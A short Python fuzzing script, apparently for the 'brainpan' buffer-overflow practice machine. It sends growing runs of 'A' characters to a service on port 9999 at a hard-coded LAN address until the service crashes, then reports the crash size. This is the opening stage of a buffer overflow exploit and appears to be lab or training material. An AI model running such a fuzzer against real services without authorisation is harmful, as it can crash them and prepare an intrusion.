#!/usr/bin/python3
#A fuzzing script to run against brainpan to see where the application crashes. replace the IP address as req'd 

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try: 
		payload = buffer + '\r\n'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.1.13',9999))
		print("[+] sending the payload...\n" + str(len(buffer)))
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
	except:
		print("fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
